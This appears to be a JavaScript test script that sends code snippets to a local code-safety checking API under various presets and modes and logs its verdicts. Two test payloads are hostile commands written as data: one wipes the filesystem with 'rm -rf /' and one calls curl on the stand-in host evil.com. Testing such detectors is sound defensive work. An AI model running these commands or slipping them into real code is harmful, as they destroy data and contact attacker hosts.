/**
 * Test different API presets and modes
 */

const API_BASE = 'http://localhost:8100';

const testCases = [
  {
    name: 'Simple code without preset',
    payload: {
      text: 'def add(a, b): return a + b',
      kind: 'response',
      mode: 'streaming_final'
    }
  },
  {
    name: 'Simple code with demo_showcase preset',
    payload: {
      text: 'def add(a, b): return a + b',
      kind: 'response',
      mode: 'streaming_final',
      preset: 'demo_showcase'
    }
  },
  {
    name: 'Malicious code without preset',
    payload: {
      text: 'import os; os.system("rm -rf /")',
      kind: 'response',
      mode: 'streaming_final'
    }
  },
  {
    name: 'Malicious code with demo_showcase preset',
    payload: {
      text: 'import os; os.system("rm -rf /")',
      kind: 'response',
      mode: 'streaming_final',
      preset: 'demo_showcase'
    }
  },
  {
    name: 'Code with default mode',
    payload: {
      text: 'subprocess.run(["curl", "evil.com"])',
      kind: 'response',
      mode: 'default'
    }
  },
  {
    name: 'Code with monitor mode',
    payload: {
      text: 'subprocess.run(["curl", "evil.com"])',
      kind: 'response',
      mode: 'monitor'
    }
  }
];

async function testCase(testCase) {
  console.log(`\nTesting: ${testCase.name}`);
  console.log('Payload:', testCase.payload);
  
  try {
    const response = await fetch(`${API_BASE}/v1/check`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(testCase.payload)
    });

    const data = await response.json();
    console.log('Result:', {
      action: data.action,
      warnings: data.warnings,
      reasons: data.reasons?.slice(0, 2), // Show first 2 reasons
      guardrails: data.metadata?.guardrails_triggered
    });
  } catch (error) {
    console.error('Error:', error.message);
  }
}

async function runTests() {
  console.log('🚀 Testing different API configurations...\n');

  for (const test of testCases) {
    await testCase(test);
  }
}

runTests();